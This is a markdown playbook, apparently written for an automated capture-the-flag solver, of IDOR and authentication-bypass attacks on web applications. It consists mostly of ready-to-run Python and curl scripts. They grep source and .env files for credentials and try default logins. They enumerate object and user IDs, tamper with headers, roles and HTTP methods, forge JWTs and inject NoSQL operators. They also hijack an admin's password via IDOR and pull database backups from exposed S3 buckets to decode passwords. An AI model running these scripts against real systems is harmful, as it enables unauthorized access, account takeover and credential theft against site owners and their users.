## IDOR & Auth Bypass Playbook

### Step 0 — Check source for seeded users BEFORE trying default creds
If source files are available, grep for seeded users — this is the fastest way to find credentials:
```bash
grep -rn "username=\|password=\|User(" app/ --include="*.py" --include="*.js" --include="*.php" | grep -v "request\."
grep -rn "INSERT INTO users" app/ | head -20
```
Common seed patterns in source:
- `User(username='test', password='test')` — Python/SQLAlchemy
- `INSERT INTO users VALUES ('admin', 'admin123')` — SQL init
- `users = [{"u": "demo", "p": "demo"}]` — hardcoded list

**Also check `.env` files**: `cat .env` often contains `ADMIN_PASSWORD=...` or `DB_PASSWORD=...`.

### Step 1 — Get authenticated
```python
import requests, base64, json
s = requests.Session()
# Try default creds
for user, pwd in [('admin', 'admin'), ('admin', 'password'), ('demo', 'demo'),
                  ('test', 'test'), ('user', 'user'), ('root', 'root')]:
    r = s.post('TARGET/login', data={'username': user, 'password': pwd})
    if r.status_code == 200 and 'login' not in r.url.lower():
        print(f"Logged in as {user}")
        break
else:
    # Register a new user
    s.post('TARGET/register', data={'username': 'attacker', 'password': 'pass123'})
    s.post('TARGET/login', data={'username': 'attacker', 'password': 'pass123'})
```

### Step 1b — Two-step login (CRITICAL for "Trading Platform" challenges)
Some apps split username and password into separate steps:
```
POST /          with {username: X}   → redirect to /password/<X>
POST /password/<X>  with {password: Y}  → sets session, redirect to /dashboard
```
Log in with the two-step flow — a single `POST /login` will NOT work:
```python
import requests
s = requests.Session()
# Step A: submit username (follow redirect to /password/<username>)
s.post('TARGET/', data={'username': 'test'}, allow_redirects=True)
# Step B: submit password at /password/<username>
r = s.post('TARGET/password/test', data={'password': 'test'}, allow_redirects=True)
# Session now authenticated
print(s.get('TARGET/dashboard').text[:500])
```
**Tell-tale signs of two-step login**:
- `/password/<username>` route exists
- Login form has only `username` field (no password)
- After submitting username, browser goes to a second page
- Source has `@app.route('/password/<username>')`

### Step 1c — Find and iterate through object IDs (CRITICAL for Trading Platform / receipts / invoices)
After login, look for any numeric ID in URLs (orders, invoices, receipts, messages, posts). The flag is often in a specific hidden ID that isn't listed in the user's own view:
```python
# Typical Trading Platform IDOR pattern:
# Your orders: /order/300123/receipt, /order/300201/receipt  (visible in /orders)
# The FLAG order has a different ID: /order/300401/receipt  (NOT listed)
# Iterate over a wide range to find it
import requests
s = requests.Session()
# ... login first ...
FOUND = []
for oid in range(300000, 300500):  # wide range
    r = s.get(f'TARGET/order/{oid}/receipt')
    if r.status_code == 200 and len(r.text) > 100:
        # Look for flag pattern or unusual content
        if 'FLAG' in r.text or 'flag{' in r.text.lower() or 'flag' in r.text.lower():
            print(f"HIT at oid={oid}: {r.text[:500]}")
            FOUND.append(oid)
        elif 'ticker' in r.text.lower():
            # Print a brief fingerprint to identify flag-carrying records
            print(f"oid={oid}: {r.text[:200]}")
```
Also try:
- IDs at round numbers (100, 1000, 10000)
- IDs slightly outside visible range: if you see 300123-300200, try 300000-300999
- Negative IDs: `/order/-1`, `/order/0`
- Non-integer variants: `/order/admin`, `/order/flag`

### Step 1d — Header-based authorization tampering (CRITICAL for "Custom Header" challenges)
Some apps enforce IDOR restrictions via custom HTTP headers. Try these overrides:
```python
headers_to_try = [
    {'X-User-Id': '1'},
    {'X-User-ID': '1'},
    {'X-UserId': '1'},
    {'X-Admin': 'true'}, {'X-Admin': '1'},
    {'X-Role': 'admin'},
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'X-Remote-Addr': '127.0.0.1'},
    {'X-Forwarded-User': 'admin'},
    {'X-Authenticated-User': 'admin'},
    {'Authorization': 'Bearer <token>'},
]
for h in headers_to_try:
    r = s.get('TARGET/admin', headers=h)
    if r.status_code == 200 and 'FLAG' in r.text.upper():
        print(f"Bypass with {h}: {r.text[:500]}")
```
Also try over-reading responses — some apps stealth-leak IDOR data in **other pages** (e.g., dashboard leaks order details from an IDOR-fuzzed request — always check `dashboard`, `profile`, `notifications`, `history` after the IDOR call).

### Step 1e — JWT with `verify_signature=False` (CRITICAL "Trading Platform - Custom Header" pattern)

**Recognize the pattern from source code:**
```python
# Login creates a signed JWT in cookie:
token = jwt.encode({"username": username, "user_id": user.id, ...}, SECRET, algorithm='HS256')
resp.set_cookie('auth_token', token)

# Dashboard DECODES without verifying signature:
data = jwt.decode(token, SECRET, algorithms=['HS256'], options={'verify_signature': False})
if 'user_id' in data and User.query.get(data['user_id']):
    user_id = data['user_id']   # ← uses attacker-controlled user_id!
```

**Exploitation — you do NOT need the secret key:**
```python
import requests, jwt, json, base64
s = requests.Session()
# 1) Two-step login
s.post('TARGET/', data={'username': 'test'})
s.post('TARGET/password/test', data={'password': 'test'})
# 2) Grab the auth_token cookie
token = s.cookies.get('auth_token')
# 3) Decode without verification (you don't know the secret)
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '==='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==='))
print(f"Original: {payload}")   # e.g. {"username": "test", "user_id": 10032, "user_type": "customer"}
# 4) Iterate user_id values — the flag is often at a low ID (1-50) or attached to a
#    special user like 'admin', 'flag', or 'master'
for uid in list(range(1, 50)) + list(range(10000, 10100)):
    # Re-encode WITHOUT signature verification — forge just the payload.
    # Many apps that use verify_signature=False will accept ANY signature (or none).
    # Try unsigned JWT first (alg=none), then try with garbage signature.
    forged = jwt.encode({"username": "attacker", "user_id": uid, "user_type": "admin"},
                        "anything", algorithm='HS256')  # signature is ignored by server
    s.cookies.set('auth_token', forged)
    r = s.get('TARGET/dashboard')
    if 'FLAG' in r.text.upper() or 'flag{' in r.text.lower():
        print(f"WIN uid={uid}: {r.text[:800]}")
        break
    # Also check response for useful data
    if r.status_code == 200 and 'username' in r.text.lower():
        import re
        m = re.search(r'(?:username|name)[^<]*?([A-Za-z0-9_-]+)', r.text[:2000])
        if m: print(f"uid={uid}: user={m.group(1)}")
```

**Flag location in Trading Platform challenges**: the flag is stored in a database column of a special user (usually `username='flag'` or similar). The dashboard renders `user.last_name` or `user.email` — which contains the flag content. So iterate user_ids and look for unusual last_name/email values.

**Also check for an "orders" / "receipts" endpoint that returns data by ID** — see Step 1c. The flag may be in `/order/<id>/receipt` instead of the dashboard.

### Step 1f — Header-based authorization tampering (CRITICAL for "Custom Header" challenges)

### Step 1g — Form parameter / role tampering (CRITICAL "Be the Admin" pattern)

When source shows `session['role'] = request.form['role']` (or similar — server takes the role/permission flag from CLIENT input rather than from the database), the bypass is to **inject `role=admin` (or `is_admin=true`) into the login POST body** even when the visible form doesn't ask for it:
```python
import requests
s = requests.Session()
# Source pattern:
#   @app.route('/login', methods=['POST'])
#   def login():
#       user = User.query.filter_by(username=username, password=password).first()
#       if user:
#           session['role'] = request.form['role']   # ← attacker-controlled!
# Exploit: log in with valid user creds + forge role=admin
r = s.post('TARGET/login', data={
    'username': 'emp', 'password': 'emppassword',
    'role': 'admin',          # ← forged — server trusts it
})
# Now /admin/dashboard works because session['role']='admin'
print(s.get('TARGET/admin/dashboard').text[:500])
```
**Tell-tale signs**:
- A hidden `<input name="role" value="employee">` in the login form
- Two login pages (`/employee/login`, `/admin/login`) but ONE login endpoint that accepts a `role` field
- Source code: `session[X] = request.form[X]` for any privilege-related field
- 2FA / MFA stages that ONLY check the OTP without re-verifying user role

**Bypass 2FA gate when role is already set in session**:
- If session[role] is set during /login (before 2FA), the 2FA check often becomes purely cosmetic
- Try accessing the protected endpoint DIRECTLY without completing 2FA
- Try POSTing to /admin/2fa with code=0000, 1234, 0, or null — many implementations short-circuit

Other parameter-tampering payloads to add to ANY login/register/profile-update form:
```
role=admin       is_admin=true     isAdmin=1       admin=1
permissions=all  user_type=admin   group=root      level=99
verified=true    privileged=true   superuser=1
```

### Step 1h — HTTP method tampering (CRITICAL "Auth 007" / `http_method_tamper` pattern)

When `/admin` blocks GET but the framework only registers GET handlers for the public path:
```bash
# Try every HTTP method — frameworks often forget to validate the method
for m in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT; do
  echo "=== $m ==="
  curl -sL -X $m TARGET/admin -i | head -10
  curl -sL -X $m TARGET/admin/dashboard -i | head -10
  curl -sL -X $m TARGET/flag -i | head -10
done
# Also try with X-HTTP-Method-Override header
for m in GET POST PUT DELETE; do
  curl -sL -X POST -H "X-HTTP-Method-Override: $m" TARGET/admin -i | head -10
  curl -sL -X POST -H "X-Method-Override: $m" TARGET/admin -i | head -10
  curl -sL -X POST -H "X-HTTP-Method: $m" TARGET/admin -i | head -10
done
```

**PHP/Apache/nginx specifics**:
- HEAD requests sometimes reveal flags in response headers OR pass auth checks because handler checks `$_SERVER['REQUEST_METHOD']=='POST'`
- Some apps gate auth on method (`if ($_SERVER['REQUEST_METHOD']==='POST'){auth();}`) — bypass with GET
- For PHP files that show flags inline, just GET `/index.php`, `/admin.php`, `/flag.php` directly — no auth needed if there's no auth check in source

**When the flag is in `index.php` itself** (the "Auth 007" pattern):
```bash
# The form may have NO method/action — flag is rendered server-side without checks
curl -sL TARGET/                    # plain GET
curl -sL TARGET/index.php           # explicit
curl -sL TARGET/?username=x         # with params (some apps gate on parameter presence)
curl -sL -X POST TARGET/ -d 'x=1'   # POST variant
```
**Always view source FIRST** — many "auth bypass" challenges have the flag literally embedded with no auth check whatsoever.

### Step 2 — Analyze cookies/tokens
```python
# Decode cookies
for c in s.cookies:
    print(f"{c.name} = {c.value}")
    try: print(f"  decoded: {base64.b64decode(c.value).decode()}")
    except: pass
# JWT decode
token = s.cookies.get('token') or s.cookies.get('access_token') or s.cookies.get('session')
if token and '.' in str(token):
    parts = token.split('.')
    for i, p in enumerate(parts[:2]):
        padded = p + '=' * (4 - len(p) % 4)
        print(f"JWT {i}: {json.loads(base64.b64decode(padded))}")
```

### Step 3 — IDOR exploitation
```python
# Enumerate user IDs (admin = usually 1)
for uid in [1, 2, 3, 0, 'admin']:
    r = s.get(f'TARGET/api/users/{uid}')
    print(f"User {uid}: {r.status_code} — {r.text[:200]}")
# Try modifying another user's data
s.post('TARGET/edit_profile/1', data={'is_admin': 'true'})
s.post('TARGET/api/change_password', json={'userId': 1, 'newPassword': 'hacked'})
# Check admin endpoints after privilege escalation
r = s.get('TARGET/admin')
print(r.text)
```

### Cookie/Token manipulation
```python
# Base64 cookie IDOR
admin_token = base64.b64encode(b'1').decode()
s.cookies.set('user_id', admin_token)
r = s.get('TARGET/profile')
print(r.text)
# Plaintext cookie
s.cookies.set('user_id', '1')
r = s.get('TARGET/dashboard')
print(r.text)
```

### NoSQL Injection (for MongoDB-based apps)
```python
import requests
# Login bypass
r = requests.post('TARGET/login', json={
    'username': {'$ne': ''},
    'password': {'$ne': ''}
})
print(r.text)
# Or via query params
r = requests.get('TARGET/api/users?username[$ne]=null')
print(r.text)
# Extract admin specifically
r = requests.post('TARGET/login', json={
    'username': 'admin',
    'password': {'$gt': ''}
})
print(r.text)
```

### GraphQL IDOR
```python
import requests
URL = 'TARGET/graphql'
# Introspect to find queries
r = requests.post(URL, json={"query": "{__schema{queryType{fields{name}}}}"})
print(r.text)
# Access other users' data
r = requests.post(URL, json={"query": '{ user(id: 1) { id username email flag } }'})
print(r.text)
# List all users
r = requests.post(URL, json={"query": '{ users { id username role } }'})
print(r.text)
```

### Auth bypass techniques
- Default creds (see Step 1)
- Registration with `role=admin` or `is_admin=true` in POST body
- HTTP method: GET `/admin` blocked? Try POST, PUT, HEAD, PATCH
- Direct access: `/admin`, `/dashboard/admin`, `/api/admin/flag`
- JWT `alg: none` or weak secret (see General playbook)
- Password reset IDOR: reset admin's password via their user ID
- Hidden resources accessible only after privilege escalation
- Private/hidden database entries visible only to admin

### IP-based access control bypass
If you see "restricted to internal", "access denied", "internal employees only", or similar IP-based restrictions:
```python
import requests
headers_to_try = [
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'X-Forwarded-Host': 'localhost'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
]
for h in headers_to_try:
    r = requests.get('TARGET/admin', headers=h)
    if 'FLAG' in r.text or r.status_code == 200:
        print(f"Bypass with {h}: {r.text[:500]}")
# Also try with POST + credentials
for h in headers_to_try:
    r = requests.post('TARGET/login', data={'username': 'admin', 'password': 'admin'}, headers=h)
    if 'FLAG' in r.text:
        print(f"Bypass with {h}: {r.text[:500]}")
```

### Password change IDOR
Look for `userId`, `user_id`, `id`, `uid` parameters in password change forms:
```python
import requests
s = requests.Session()
# Register and login as attacker
s.post('TARGET/register', data={'username': 'attacker', 'password': 'pass123'})
s.post('TARGET/login', data={'username': 'attacker', 'password': 'pass123'})
# Change ADMIN's password by setting userId=1 (admin is usually ID 1)
r = s.post('TARGET/change_password', data={
    'oldPassword': 'pass123',
    'newPassword': 'hacked',
    'confirmPassword': 'hacked',
    'userId': '1'  # IDOR — changing admin's password, not our own
})
# Now login as admin with the new password
s2 = requests.Session()
s2.post('TARGET/login', data={'username': 'admin', 'password': 'hacked'})
r = s2.get('TARGET/profile')
print(r.text)  # Flag should be in admin's profile
```

### JWT Forgery + S3 Exploitation

When the challenge involves JWT tokens and S3/object storage, follow this chain:

**Step 1 — Find S3 on alternate ports:**
```python
import requests
# S3 is often on a separate port exposed alongside the main app
for port in [8333, 9000, 4566]:
    try:
        r = requests.get(f'http://TARGET_HOST:{port}/', timeout=3)
        print(f"Port {port}: {r.status_code} — {r.text[:200]}")
    except: pass
```
**IMPORTANT**: Check the target description / scope for additional services running on alternate ports (e.g. "S3 on host:PORT").

**Step 2 — List and download from S3 buckets:**
```python
# List buckets
r = requests.get(f'http://TARGET_HOST:S3_PORT/')
print(r.text)  # XML listing of buckets

# Common bucket names to try
for bucket in ['backups', 'assets', 'data', 'uploads', 'private']:
    r = requests.get(f'http://TARGET_HOST:S3_PORT/{bucket}?prefix=')
    if r.status_code == 200:
        print(f"Bucket '{bucket}': {r.text[:500]}")

# Download database backup
r = requests.get(f'http://TARGET_HOST:S3_PORT/backups/manapool.db')
with open('/tmp/db.sqlite', 'wb') as f:
    f.write(r.content)
```

**Step 3 — Extract credentials from database:**
```python
import sqlite3, base64
conn = sqlite3.connect('/tmp/db.sqlite')
for row in conn.execute('SELECT * FROM users'):
    print(row)
    # Passwords may be base64-encoded — decode them
    try:
        pwd = base64.b64decode(row[3]).decode()
        print(f"  decoded password: {pwd}")
    except: pass
# Find admin/master user (isMaster=1 or role='admin')
admin = conn.execute("SELECT * FROM users WHERE isMaster=1").fetchone()
print(f"Admin user: uid={admin[0]}, email={admin[1]}")
```

**Step 4 — Find JWT secret and forge token:**
```python
import jwt  # PyJWT
# Secret is in .env, JS source, or config
# Check: view-source, /_next/static/chunks/, /.env, /api/config
SECRET = "found_secret_key"
ADMIN_UID = "admin_uid_from_db"
token = jwt.encode({"uid": ADMIN_UID}, SECRET, algorithm="HS256")
print(f"Forged token: {token}")
```

**Step 5 — Access admin panel with forged token:**
```python
# Try as query parameter
r = requests.get(f'http://TARGET/api/user?token={token}')
print(r.text)
# Try as cookie
r = requests.get('http://TARGET/adminpanel/profile', cookies={'token': token})
print(r.text)
# The flag is usually shown only to master/admin users
```
